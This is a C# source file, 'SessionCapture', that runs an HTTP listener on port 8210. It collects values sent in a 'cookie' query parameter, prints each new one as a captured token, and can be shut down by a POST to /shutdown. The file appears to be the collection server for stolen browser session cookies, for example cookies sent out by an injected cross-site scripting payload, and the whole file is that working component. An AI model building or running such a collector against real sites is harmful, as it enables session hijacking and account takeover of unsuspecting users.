namespace SessionCapture;

using System;
using System.IO;
using System.Text;
using System.Net;
using System.Web;
using System.Threading.Tasks;

// Heavily based on
// https://gist.github.com/define-private-public/d05bc52dd0bed1c4699d49e2737e80e7

class Program
{
    private static HttpListener? listener;
    private static string url = "http://*:8210/";
    private static bool runServer = true;
    private static List<String> tokens = new List<String>();
    private static Mutex consoleLock = new Mutex();
    private static Mutex tokenLock = new Mutex();

    private static void WriteLine(String line) {
        consoleLock.WaitOne();
        Console.WriteLine(line);
        consoleLock.ReleaseMutex();
    }

    private static async Task HandleConnection(HttpListenerContext ctx) {
        byte[] data = Encoding.UTF8.GetBytes("{}");
        ctx.Response.ContentType = "text/html";
        ctx.Response.ContentEncoding = Encoding.UTF8;
        ctx.Response.ContentLength64 = data.LongLength;

        // Write to response stream and close connection
        await ctx.Response.OutputStream.WriteAsync(data, 0, data.Length);
        ctx.Response.Close();

        if (ctx.Request.Url is not null
            && ctx.Request.Url.Query.Length > 0) {
            var urlParams = HttpUtility.ParseQueryString(
                ctx.Request.Url.Query);
            String? token = urlParams["cookie"];
            String? result = null;

            tokenLock.WaitOne();
            if (token is not null && token.Length > 0
                && !tokens.Contains(token)) {
                result = String.Format("GOT TOKEN:\n{0}\n", token);
                tokens.Add(token);
            }
            tokenLock.ReleaseMutex();

            if (result is not null) {
                WriteLine(result);
            }
        }

        // Shutdown server on shutdown HTTP post request
        if (ctx.Request.HttpMethod == "POST"
            && ctx.Request.Url!.AbsolutePath == "/shutdown") {
            runServer = false;
            WriteLine("Shutdown requested");
        }
    }

    private static async Task HandleIncomingConnections()
    {
        if (listener is null) {
            WriteLine("Listener is null!");
            return;
        }

        while (runServer) {
            // Wait until we get a connection
            HttpListenerContext ctx = await listener.GetContextAsync();

            // Offload handling to thread, allowing multi-clients
            _ = HandleConnection(ctx);
        }
    }

    static void Main(string[] args)
    {
        // Create HTTP server and listen to connections
        listener = new HttpListener();
        listener.Prefixes.Add(url);
        listener.Start();

        Console.WriteLine("Listening for connections on {0}\n", url);    

        // Handle incoming requests
        Task listenTask = HandleIncomingConnections();
        listenTask.GetAwaiter().GetResult();

        // Close the listener
        listener.Close();
    }
}
